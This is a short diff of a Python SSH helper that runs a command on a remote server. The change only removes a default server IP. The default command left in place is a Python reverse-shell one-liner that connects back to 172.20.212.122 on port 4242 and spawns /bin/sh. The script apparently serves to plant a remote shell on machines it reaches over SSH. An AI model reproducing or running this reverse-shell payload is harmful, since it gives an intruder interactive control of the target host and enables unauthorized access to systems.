@@ -19,7 +19,7 @@ def ssh_command(ip,port,user,passwd,cmd):
 def SSH_setup():
     user=input("Username: ")
     password=getpass.getpass()
-    ip=input("Enter server IP: ") or "172.20.212.155"
+    ip=input("Enter server IP: ")
     port=input("Enter port:") or "22"
     cmd=input("enter command:") or "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.20.212.122\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
     ssh_command(ip,port,user,password,cmd)
